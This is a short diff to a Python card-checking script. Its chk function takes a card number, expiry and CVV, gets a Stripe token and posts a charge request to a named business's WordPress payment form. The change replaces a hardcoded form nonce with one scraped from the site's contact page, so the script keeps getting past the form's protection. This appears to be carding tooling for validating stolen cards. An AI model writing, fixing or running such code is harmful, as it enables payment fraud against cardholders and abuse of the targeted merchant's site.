@@ -5,6 +5,7 @@ import colorama
 import sys
 import time
 import io
+import re
 
 colorama.init(autoreset=True)
 
@@ -88,10 +89,13 @@ def chk(CCN, MM, YY, CVV):
     COU = token.json()["card"]["country"]
     time.sleep(1)
 
+    nonce = s.get("https://www.cpadventure.ie/pages/contact-2/").text
+    form = re.findall(r'formNonce" value="[\'"]?([^\'" >]+)', nonce)
+
     load = {
         "action": "wp_full_stripe_payment_charge",
         "formName": "myform",
-        "formNonce": "0648fccb94",
+        "formNonce": form[0],
         "fullstripe_address_line1": Street,
         "fullstripe_address_city": City,
         "fullstripe_address_zip": Zip,
